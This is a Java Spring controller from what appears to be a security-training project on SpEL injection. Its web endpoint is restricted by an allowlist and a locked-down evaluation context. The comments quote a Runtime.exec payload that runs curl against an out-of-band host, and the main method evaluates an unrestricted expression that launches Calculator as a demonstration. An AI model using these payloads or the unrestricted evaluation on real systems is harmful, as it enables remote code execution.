package org.joychou.controller;

import java.util.Collections;

import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.EvaluationException;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.MethodResolver;
import org.springframework.expression.PropertyAccessor;
import org.springframework.expression.TypeLocator;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        // Reject (never sanitise) everything except a short literal/arithmetic expression:
        // digits, whitespace, + - * / % ( ) . and comparison characters. No letters means no
        // T(...), new, method calls, property or bean references can ever be parsed.
        if (expression == null || expression.length() > 200
                || !LITERAL_ARITHMETIC_PATTERN.matcher(expression).matches()) {
            return "Expression not allowed!!";
        }
        ExpressionParser parser = new SpelExpressionParser();
        EvaluationContext context = restrictedContext();
        Object value = parser.parseExpression(expression).getValue(context);
        return HtmlUtils.htmlEscape(String.valueOf(value));
    }

    private static final java.util.regex.Pattern LITERAL_ARITHMETIC_PATTERN =
            java.util.regex.Pattern.compile("^[0-9+\\-*/%().<>=! ]+$");

    /**
     * Build an evaluation context for untrusted expressions. The project uses Spring
     * Framework 4.3.x (Spring Boot 1.5.1), which has no SimpleEvaluationContext, so the
     * equivalent restrictions are applied to a StandardEvaluationContext: no type
     * references (T(...)), no constructors (new), no method invocation, no property
     * accessors and no bean references. Literals, operators and collections still work.
     */
    private static EvaluationContext restrictedContext() {
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(new TypeLocator() {
            @Override
            public Class<?> findType(String typeName) throws EvaluationException {
                throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
            }
        });
        context.setConstructorResolvers(Collections.<ConstructorResolver>emptyList());
        context.setMethodResolvers(Collections.<MethodResolver>emptyList());
        context.setPropertyAccessors(Collections.<PropertyAccessor>emptyList());
        context.setBeanResolver(null);
        return context;
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

